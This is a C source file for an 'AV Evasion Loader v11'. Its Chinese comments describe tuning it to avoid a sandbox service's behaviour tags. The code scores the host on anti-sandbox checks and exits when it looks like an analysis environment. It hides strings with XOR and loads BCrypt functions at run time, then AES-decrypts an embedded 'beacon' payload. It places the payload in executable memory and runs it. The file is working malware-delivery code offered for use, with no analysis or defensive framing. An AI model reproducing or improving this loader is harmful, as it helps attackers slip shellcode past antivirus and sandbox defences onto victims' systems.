#include <windows.h>

// ============================================================
//  AV Evasion Loader v11 — 行为降噪版
//
//  v10 -> v11 (针对微步行为标签降噪):
//    - 去掉延迟 Sleep   (消除"尝试拖慢分析任务进度"标签)
//    - 去掉枚举进程     (消除"枚举进程或线程"标签, Toolhelp)
//    - 保留反沙箱       (鼠标/时长/核数/内存/屏幕, >=2 判沙箱)
//    - 保留 AES-256-CBC + BCrypt 动态解析 + 字符串 patch
// ============================================================

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000)

typedef NTSTATUS (NTAPI *pBCryptOpenAlgorithmProvider)(
    void **phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptSetProperty)(
    void *hObject, LPCWSTR pszProperty, const UCHAR *pbInput,
    ULONG cbInput, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptGenerateSymmetricKey)(
    void *hAlgorithm, void **phKey, UCHAR *pbKeyObject,
    ULONG cbKeyObject, const UCHAR *pbSecret, ULONG cbSecret, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptDecrypt)(
    void *hKey, UCHAR *pbInput, ULONG cbInput, void *pPaddingInfo,
    UCHAR *pbIV, ULONG cbIV, UCHAR *pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptDestroyKey)(void *hKey);
typedef NTSTATUS (NTAPI *pBCryptCloseAlgorithmProvider)(void *hAlgorithm, ULONG dwFlags);

#define XOR_KEY 0x5A

static inline void DecryptStr(const BYTE* enc, char* dec, SIZE_T maxLen) {
    volatile SIZE_T i;
    for (i = 0; i < maxLen - 1 && enc[i] != 0; i++) {
        dec[i] = (char)(enc[i] ^ XOR_KEY);
    }
    dec[i] = '\0';
}

static const BYTE enc_bcrypt[] = { 'b'^0x5A, 'c'^0x5A, 'r'^0x5A, 'y'^0x5A, 'p'^0x5A, 't'^0x5A, '.'^0x5A, 'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0^0x5A };

static const wchar_t AES_ALG[]   = L"AES";
static const wchar_t CHAIN_CBC[] = L"ChainingModeCBC";
static const wchar_t PROP_CHAIN[] = L"ChainingMode";

// ============================================================
//  反沙箱 (轻量, 无进程枚举)
// ============================================================

static BOOL MouseStatic(void) {
    POINT a, b;
    if (!GetCursorPos(&a)) return FALSE;
    for (int i = 0; i < 16; i++) {
        Sleep(250);
        if (!GetCursorPos(&b)) return FALSE;
        if (a.x != b.x || a.y != b.y) return FALSE;
    }
    return TRUE;
}

static BOOL LowUptime(void) {
    return GetTickCount64() < 10ull * 60 * 1000;
}

static BOOL FewCores(void) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors < 2;
}

static BOOL LowMemory(void) {
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (!GlobalMemoryStatusEx(&ms)) return FALSE;
    return ms.ullTotalPhys < (2ull * 1024 * 1024 * 1024);
}

static BOOL TinyScreen(void) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    return (w < 800) || (h < 600);
}

// >= 2 hits => sandbox
static BOOL AntiSandbox(void) {
    int score = 0;
    if (MouseStatic()) score++;
    if (LowUptime())   score++;
    if (FewCores())    score++;
    if (LowMemory())   score++;
    if (TinyScreen())  score++;
    return score >= 2;
}

// ============================================================
#include "payload_v8.h"

// ============================================================
int main() {
    if (AntiSandbox()) return 0;

    char bcryptName[16];
    DecryptStr(enc_bcrypt, bcryptName, sizeof(bcryptName));

    HMODULE hBcrypt = LoadLibraryA(bcryptName);
    SecureZeroMemory(bcryptName, sizeof(bcryptName));
    if (!hBcrypt) return 0;

    pBCryptOpenAlgorithmProvider fnOpen = (pBCryptOpenAlgorithmProvider)GetProcAddress(hBcrypt, "BCryptOpenAlgorithmProvider");
    pBCryptSetProperty fnSetProp = (pBCryptSetProperty)GetProcAddress(hBcrypt, "BCryptSetProperty");
    pBCryptGenerateSymmetricKey fnGenKey = (pBCryptGenerateSymmetricKey)GetProcAddress(hBcrypt, "BCryptGenerateSymmetricKey");
    pBCryptDecrypt fnDecrypt = (pBCryptDecrypt)GetProcAddress(hBcrypt, "BCryptDecrypt");
    pBCryptDestroyKey fnDestroyKey = (pBCryptDestroyKey)GetProcAddress(hBcrypt, "BCryptDestroyKey");
    pBCryptCloseAlgorithmProvider fnClose = (pBCryptCloseAlgorithmProvider)GetProcAddress(hBcrypt, "BCryptCloseAlgorithmProvider");

    if (!fnOpen || !fnSetProp || !fnGenKey || !fnDecrypt || !fnDestroyKey || !fnClose) {
        return 0;
    }

    SIZE_T ptSize = ENC_BEACON_LEN;
    unsigned char* plain = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ptSize);
    if (!plain) return 0;

    void *hAlg = NULL, *hKey = NULL;
    NTSTATUS st = STATUS_SUCCESS;

    st = fnOpen(&hAlg, AES_ALG, NULL, 0);
    if (st != STATUS_SUCCESS) goto fail;

    st = fnSetProp(hAlg, PROP_CHAIN, (const UCHAR*)CHAIN_CBC, sizeof(CHAIN_CBC), 0);
    if (st != STATUS_SUCCESS) goto fail;

    st = fnGenKey(hAlg, &hKey, NULL, 0, (UCHAR*)aes_key, 32, 0);
    if (st != STATUS_SUCCESS) goto fail;

    UCHAR iv[16];
    memcpy(iv, aes_iv, 16);

    ULONG done = 0;
    st = fnDecrypt(hKey, (UCHAR*)enc_beacon, (ULONG)ENC_BEACON_LEN, NULL,
                   iv, 16, plain, (ULONG)ptSize, &done, 0);
    if (st != STATUS_SUCCESS || done == 0) goto fail;

    if (hKey) fnDestroyKey(hKey);
    if (hAlg) fnClose(hAlg, 0);
    FreeLibrary(hBcrypt);

    SIZE_T payloadLen = done;
    if (payloadLen > 0) {
        BYTE pad = plain[payloadLen - 1];
        if (pad > 0 && pad <= 16 && payloadLen >= pad) {
            payloadLen -= pad;
        }
    }

    unsigned char* execBuf = (unsigned char*)VirtualAlloc(
        NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execBuf) {
        SecureZeroMemory(plain, ptSize);
        HeapFree(GetProcessHeap(), 0, plain);
        return 0;
    }

    memcpy(execBuf, plain, payloadLen);

    SecureZeroMemory(plain, ptSize);
    HeapFree(GetProcessHeap(), 0, plain);

    DWORD oldProt = 0;
    if (!VirtualProtect(execBuf, payloadLen, PAGE_EXECUTE_READ, &oldProt)) {
        VirtualFree(execBuf, 0, MEM_RELEASE);
        return 0;
    }

    FlushInstructionCache(GetCurrentProcess(), execBuf, payloadLen);

    typedef void (*ShellcodeEntry)();
    ShellcodeEntry entry = (ShellcodeEntry)execBuf;
    entry();

    VirtualFree(execBuf, 0, MEM_RELEASE);
    return 0;

fail:
    if (hKey) fnDestroyKey(hKey);
    if (hAlg) fnClose(hAlg, 0);
    FreeLibrary(hBcrypt);
    SecureZeroMemory(plain, ptSize);
    HeapFree(GetProcessHeap(), 0, plain);
    return 0;
}
